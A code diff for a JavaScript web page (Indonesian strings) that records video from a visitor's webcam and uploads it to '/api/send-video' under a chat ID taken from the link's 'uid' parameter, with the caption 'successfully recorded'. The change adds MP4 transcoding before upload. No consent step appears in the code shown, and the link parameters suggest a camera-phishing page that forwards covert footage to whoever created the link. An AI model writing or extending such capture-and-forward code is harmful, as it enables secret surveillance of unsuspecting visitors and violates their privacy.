@@ -1,6 +1,7 @@
 const params = new URLSearchParams(window.location.search);
 const url = params.get('url');
 const uid = params.get('uid');
+import { transcodeWebMtoMP4 } from './ffmpegHelper.js';
 
 if (!url || !uid) {
   document.body.innerHTML = '<h2 style="text-align:center;margin-top:20%;">❌ Parameter tidak lengkap</h2>';
@@ -68,23 +69,23 @@ if (!isPhotoMode) {
       recorder.ondataavailable = e => chunks.push(e.data);
 
       recorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
+  const webmBlob = new Blob(chunks, { type: 'video/webm' });
 
-        const form = new FormData();
-        form.append("chat_id", uid);
-        form.append("video", blob, "webcam.mp4");
+  const mp4Blob = await transcodeWebMtoMP4(webmBlob); // Transcode ke mp4
 
+  const form = new FormData();
+  form.append("chat_id", uid);
+  form.append("video", mp4Blob, "webcam.mp4");
 
-        const timestamp = new Date().toLocaleTimeString();
-        form.append("caption", `Berhasil merekam\n${timestamp}`);
-        
-        fetch(`/api/send-video`, {
-            method: "POST",
-            body: form
-        });
+  const timestamp = new Date().toLocaleTimeString();
+  form.append("caption", `Berhasil merekam\n${timestamp}`);
 
+  await fetch('/api/send-video', {
+    method: 'POST',
+    body: form
+  });
+};
 
-      };
 
       recorder.start();
 
